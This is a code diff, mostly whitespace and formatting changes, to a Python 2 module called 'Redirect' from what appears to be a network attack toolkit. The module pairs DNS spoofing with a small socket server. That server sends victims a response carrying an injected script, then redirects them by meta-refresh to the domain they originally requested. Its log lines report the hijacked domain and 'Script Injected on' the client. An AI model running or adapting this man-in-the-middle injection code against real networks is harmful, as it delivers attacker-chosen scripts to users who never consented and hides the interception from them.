@@ -24,12 +24,10 @@ import threading
 
 
 class Redirect(object):
-
     name = "Redirect"
     desc = "Redirect to page with script then let client go"
     version = "0.3"
     ps = "Will need to change the way of injection to netfilter packet injection."
-
 
     def __init__(self, host, port, js):
         self.host = host
@@ -74,25 +72,26 @@ Content-Type: text/html
 
     def server(self):
         print "[+] Redirect with script injection initialized."
-        self.dnsspoof.start(None,"Inject")
+        self.dnsspoof.start(None, "Inject")
 
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server_address = (self.host, self.port)
-        print '[+] Injection URL - http://{}:{}'.format(self.host,self.port)
+        print '[+] Injection URL - http://{}:{}'.format(self.host, self.port)
         server.bind(server_address)
         server.listen(1)
 
-        for i in range (0,2):
+        for i in range(0, 2):
             if i >= 1:
                 domain = self.dnsspoof.getdomain()
-                domain = domain [:-1]
+                domain = domain[:-1]
                 print "[+] Target was requesting: {}".format(domain)
                 self.dnsspoof.stop()
 
                 try:
-                    connection,client_address = server.accept()
-                    redirect = self.response + """<body> <meta http-equiv="refresh" content="0; URL='http://{}"/> </body>""".format(domain)
+                    connection, client_address = server.accept()
+                    redirect = self.response + """<body> <meta http-equiv="refresh" content="0; URL='http://{}"/> </body>""".format(
+                        domain)
                     connection.send("%s" % redirect)
                     print "[+] Script Injected on: ", client_address
                     connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
@@ -101,10 +100,9 @@ Content-Type: text/html
                     server.close()
 
             try:
-                connection,client_address = server.accept()
+                connection, client_address = server.accept()
                 connection.send("%s" % self.response)
                 connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
                 connection.close()
             except KeyboardInterrupt:
                 server.close()
-
